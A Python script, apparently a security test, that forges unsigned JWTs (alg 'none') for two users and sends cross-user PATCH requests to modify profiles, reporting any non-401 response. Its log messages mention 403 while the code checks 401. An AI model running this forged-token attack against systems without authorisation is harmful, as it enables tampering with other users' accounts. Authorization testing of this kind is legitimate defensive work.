import base64
import requests
import argparse

if __name__ == '__main__':
    parse = argparse.ArgumentParser(
        description="Check if unsigned JWT token from user A can modify resources of user B"
    )

    parse.add_argument(
        '--first_user_url',
        help='Which URL we will make the request for updating the first user',
        type=str,
        required=True
    )

    parse.add_argument(
        '--second_user_url',
        help='Which URL we will make the request for updating the second user',
        type=str,
        required=True
    )

    parse.add_argument(
        '--first_user_body',
        help='The JWT payload to be base64 encoded for the first user JWT token',
        type=str,
        required=True
    )

    parse.add_argument(
        '--second_user_body',
        help='The JWT payload to be base64 encoded for the second user JWT token',
        type=str,
        required=True
    )

    args = parse.parse_args()

    first_user_url = args.first_user_url
    second_user_url = args.second_user_url

    first_user_header = '{"typ": "JWT", "alg": "none"}'
    first_user_body = args.first_user_body

    header_encoded = base64.b64encode(bytes(first_user_header, 'utf-8')).decode('ascii').strip('=')
    body_encoded = base64.b64encode(bytes(first_user_body, 'utf-8')).decode('ascii').strip('=')
    first_user_jwt_token = header_encoded + "." + body_encoded + "."

    print("First user token:")
    print(first_user_jwt_token)

    second_user_header = '{"typ": "JWT", "alg": "none"}'
    second_user_body = args.second_user_body

    second_user_header_encoded = base64.b64encode(bytes(second_user_header, 'utf-8')).decode('ascii').strip('=')
    second_user_body_encoded = base64.b64encode(bytes(second_user_body, 'utf-8')).decode('ascii').strip('=')
    second_user_jwt_token = second_user_header_encoded + "." + second_user_body_encoded + "."

    print("Second user token:")
    print(second_user_jwt_token)

    # Try to modify the resources of first user with the token from the second user
    response = requests.patch(
        url=first_user_url,
        json={"user": {"name": "maria teresa zzzzzzz", "bio": ""}},
        headers={ 'Authorization': second_user_jwt_token }
    )

    print("Response to modify resource from user A using unsigned JWT token from user B was {}".format(response.text))

    if response.status_code != 401:
        print("Making a response to modify first user with an unsigned JWT token from the second user has resulted in "
              "a response different than 403 FORBIDDEN")
        print("Response received")
        print(response.text)

    # Try to modify the resources of second user with the token from the first user
    response = requests.patch(
        url=second_user_url,
        json={"user": {"name": "maria teresa zzzzzzz", "bio": ""}},
        headers={'Authorization': first_user_jwt_token}
    )

    print("Response to modify resource from user B using unsigned JWT token from user A was {}".format(response.text))

    if response.status_code != 401:
        print(
            "Making a response to modify first user with an unsigned JWT token from the second user has resulted in "
            "a response different than 403 FORBIDDEN")
        print("Response received")
        print(response.text)
